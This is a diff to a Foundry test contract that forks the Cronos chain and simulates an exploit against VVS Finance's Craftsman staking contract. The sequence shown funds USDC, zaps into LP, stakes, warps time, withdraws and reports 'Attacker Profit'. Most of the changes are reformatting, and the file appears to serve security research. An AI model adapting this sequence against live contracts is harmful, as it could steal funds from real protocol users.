@@ -7,8 +7,8 @@ import "flow/test_flow.sol";
 contract ContractTest is CronosCommon {
     using SafeMath for uint256;
 
-    function setUp() public override {
-        super.setUp();
+    function setUp() public {
+        super.setUp2();
 
         cheats.createSelectFork("cronos", 8305182);
 
@@ -42,7 +42,8 @@ contract ContractTest is CronosCommon {
             uint256 lastRewardBlock;
             uint256 accVVSPerShare;
 
-            (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);
+            (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman
+                .poolInfo(lp_pid);
 
             // Determine if the address is a smart contract
             if (ContractHelper.isContract(lpToken)) {
@@ -52,7 +53,11 @@ contract ContractTest is CronosCommon {
                     // Fund the account with flashloan and/or cash
                     // uint account_deposit_amount = 443 * 1e9;
                     uint account_deposit_amount = 400 * 1e9;
-                    writeTokenBalance(address(this), address(USDC), account_deposit_amount);
+                    writeTokenBalance(
+                        address(this),
+                        address(USDC),
+                        account_deposit_amount
+                    );
 
                     emit log_named_decimal_uint(
                         "[Start] Attacker USDC balance before exploit",
@@ -69,9 +74,13 @@ contract ContractTest is CronosCommon {
         }
     }
 
-    function handle_valid_lp(uint lp_pid, address lpToken, uint account_deposit_amount) private {
+    function handle_valid_lp(
+        uint lp_pid,
+        address lpToken,
+        uint account_deposit_amount
+    ) private {
         // LP
-        uint token_staking_pid = 0;   // Hardcoded value in Craftsman
+        uint token_staking_pid = 0; // Hardcoded value in Craftsman
 
         // Craftsman's UserInfo
         uint256 lp_deposit_amount;
@@ -81,8 +90,16 @@ contract ContractTest is CronosCommon {
         IVVSPair lp_pair = IVVSPair(lpToken);
         IERC20 symbol0 = IERC20(lp_pair.token0());
         IERC20 symbol1 = IERC20(lp_pair.token1());
-        string memory pair_name = StringHelper.concatenateStringsWithSlash(symbol0.symbol(), symbol1.symbol());
-        console.log("[Start] Target LP @ %s, PID: %d, Pair: %s", lpToken, lp_pid, pair_name);
+        string memory pair_name = StringHelper.concatenateStringsWithSlash(
+            symbol0.symbol(),
+            symbol1.symbol()
+        );
+        console.log(
+            "[Start] Target LP @ %s, PID: %d, Pair: %s",
+            lpToken,
+            lp_pid,
+            pair_name
+        );
 
         // Assign label to address
         cheats.label(address(symbol0), symbol0.symbol());
@@ -110,13 +127,13 @@ contract ContractTest is CronosCommon {
             USDC_to_symbol(symbol0, type(uint256).max);
         } else if (symbol0 == USDC) {
             // Convert USDC to VVS for staking
-            USDC_to_symbol(VVS, USDC.balanceOf(address(this)) * 50 / 100);
+            USDC_to_symbol(VVS, (USDC.balanceOf(address(this)) * 50) / 100);
         } else {
             // Convert USDC to symbol0 for deposit and withdrawal
-            USDC_to_symbol(symbol0, USDC.balanceOf(address(this)) * 50 / 100);
+            USDC_to_symbol(symbol0, (USDC.balanceOf(address(this)) * 50) / 100);
 
             // Convert USDC to VVS for staking
-            USDC_to_symbol(VVS, USDC.balanceOf(address(this)) * 50 / 100);
+            USDC_to_symbol(VVS, (USDC.balanceOf(address(this)) * 50) / 100);
         }
 
         if (symbol0 != VVS) {
@@ -132,13 +149,15 @@ contract ContractTest is CronosCommon {
             symbol0.balanceOf(address(this)),
             symbol0.decimals()
         );
-        console.log("---------------------------------------------------------------------");
+        console.log(
+            "---------------------------------------------------------------------"
+        );
 
         if (symbol0 == VVS || symbol0 == USDC) {
             // Swap symbol0 tokens into LP
             Zap.zapInToken(
                 address(symbol0),
-                (symbol0.balanceOf(address(this)) * 50 / 100),
+                ((symbol0.balanceOf(address(this)) * 50) / 100),
                 address(lp_pair),
                 1
             );
@@ -158,8 +177,14 @@ contract ContractTest is CronosCommon {
         // Stake VVS tokens
         Craftsman.enterStaking((VVS.balanceOf(address(this))));
 
-        (lp_deposit_amount, rewardDebt) = Craftsman.userInfo(lp_pid, address(this));
-        (token_staking_amount, rewardDebt) = Craftsman.userInfo(token_staking_pid, address(this));
+        (lp_deposit_amount, rewardDebt) = Craftsman.userInfo(
+            lp_pid,
+            address(this)
+        );
+        (token_staking_amount, rewardDebt) = Craftsman.userInfo(
+            token_staking_pid,
+            address(this)
+        );
 
         if (symbol0 != VVS) {
             emit log_named_decimal_uint(
@@ -187,19 +212,29 @@ contract ContractTest is CronosCommon {
             VVS.decimals()
         );
 
-        console.log("---------------------------------------------------------------------");
+        console.log(
+            "---------------------------------------------------------------------"
+        );
         // Move time forward
         cheats.warp(block.timestamp + 1 * 60 * 60); // Move forward an hour later
 
         // Change the block.number
-        cheats.roll(block.number + 1 * 60);     // Simply move the block number to future
+        cheats.roll(block.number + 1 * 60); // Simply move the block number to future
         Craftsman.massUpdatePools();
         // Craftsman.updatePool(token_staking_pid);
         console.log("Time and block number moved...");
-        console.log("---------------------------------------------------------------------");
+        console.log(
+            "---------------------------------------------------------------------"
+        );
 
-        (lp_deposit_amount, rewardDebt) = Craftsman.userInfo(lp_pid, address(this));
-        (token_staking_amount, rewardDebt) = Craftsman.userInfo(token_staking_pid, address(this));
+        (lp_deposit_amount, rewardDebt) = Craftsman.userInfo(
+            lp_pid,
+            address(this)
+        );
+        (token_staking_amount, rewardDebt) = Craftsman.userInfo(
+            token_staking_pid,
+            address(this)
+        );
 
         if (symbol0 != VVS) {
             emit log_named_decimal_uint(
@@ -226,13 +261,21 @@ contract ContractTest is CronosCommon {
             token_staking_amount,
             VVS.decimals()
         );
-        console.log("---------------------------------------------------------------------");
+        console.log(
+            "---------------------------------------------------------------------"
+        );
 
         // Unstack symbol0 tokens
         Craftsman.leaveStaking(token_staking_amount);
 
-        (lp_deposit_amount, rewardDebt) = Craftsman.userInfo(lp_pid, address(this));
-        (token_staking_amount, rewardDebt) = Craftsman.userInfo(token_staking_pid, address(this));
+        (lp_deposit_amount, rewardDebt) = Craftsman.userInfo(
+            lp_pid,
+            address(this)
+        );
+        (token_staking_amount, rewardDebt) = Craftsman.userInfo(
+            token_staking_pid,
+            address(this)
+        );
 
         if (symbol0 != VVS) {
             emit log_named_decimal_uint(
@@ -259,13 +302,21 @@ contract ContractTest is CronosCommon {
             token_staking_amount,
             VVS.decimals()
         );
-        console.log("---------------------------------------------------------------------");
+        console.log(
+            "---------------------------------------------------------------------"
+        );
 
         // Emergency withdrawal
         Craftsman.emergencyWithdraw(lp_pid);
 
-        (lp_deposit_amount, rewardDebt) = Craftsman.userInfo(lp_pid, address(this));
-        (token_staking_amount, rewardDebt) = Craftsman.userInfo(token_staking_pid, address(this));
+        (lp_deposit_amount, rewardDebt) = Craftsman.userInfo(
+            lp_pid,
+            address(this)
+        );
+        (token_staking_amount, rewardDebt) = Craftsman.userInfo(
+            token_staking_pid,
+            address(this)
+        );
 
         if (symbol0 != VVS) {
             emit log_named_decimal_uint(
@@ -292,7 +343,9 @@ contract ContractTest is CronosCommon {
             token_staking_amount,
             VVS.decimals()
         );
-        console.log("---------------------------------------------------------------------");
+        console.log(
+            "---------------------------------------------------------------------"
+        );
 
         // Withdraw token(s) out from Pair LP
         Zap.zapOut(
@@ -310,7 +363,13 @@ contract ContractTest is CronosCommon {
         }
 
         // INFO: APE, DARK etc. symbol could not be converted to USDC
-        if (symbol1 != USDC && symbol1 != APE && symbol1 != DARK && symbol1 != SKY && symbol1 != LCRO) {
+        if (
+            symbol1 != USDC &&
+            symbol1 != APE &&
+            symbol1 != DARK &&
+            symbol1 != SKY &&
+            symbol1 != LCRO
+        ) {
             if (symbol1.balanceOf(address(this)) > 0) {
                 // Convert symbol1 back to USDC
                 symbol_to_USDC(symbol1, type(uint256).max);
@@ -348,9 +407,13 @@ contract ContractTest is CronosCommon {
             USDC.decimals()
         );
 
-        console.log("---------------------------------------------------------------------");
+        console.log(
+            "---------------------------------------------------------------------"
+        );
         if (USDC.balanceOf(address(this)) > account_deposit_amount) {
-            uint attacker_profit = USDC.balanceOf(address(this)).sub(account_deposit_amount);
+            uint attacker_profit = USDC.balanceOf(address(this)).sub(
+                account_deposit_amount
+            );
             emit log_named_decimal_uint(
                 "Attacker Profit in USDC",
                 attacker_profit,
